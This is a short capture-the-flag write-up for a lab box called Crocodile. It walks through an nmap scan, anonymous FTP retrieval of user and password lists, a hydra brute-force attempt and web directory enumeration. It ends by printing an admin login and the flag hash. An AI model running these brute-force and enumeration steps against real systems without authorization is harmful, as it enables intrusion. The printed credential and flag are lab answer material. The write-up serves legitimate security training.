
## CTF Writeup: Crocodile

---
## Reconnaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.1.15  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-12 18:07 -0500
Nmap scan report for 10.129.1.15
Host is up (0.035s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.44
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Smash - Bootstrap Business Template
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.34 seconds
```

There seems to be an FTP Service running on default-port and an http website.

Connected to the FTP Service as anonymous user.

```
ftp 10.129.1.15 21
get allowed.userlist
get allowed.userlist.passwd
```

Tried bruteforcing the ftp service with the retrieved wordlists, but didn't work!

```
hydra -L allowed.userlist -P allowed.userlist.passwd ftp://10.129.1.15
```

Enumerated Endpoints & discovered an /dashboard endpoint which redirected to an /login.php endpoint.

```
feroxbuster --url http://10.129.1.15
```

Logged in as admin user.

```
admin:rKXM59ESxesUFHAd
```

Retrieved flag.txt.

```
c7110277ac44d78b6a9fff2232434d16
```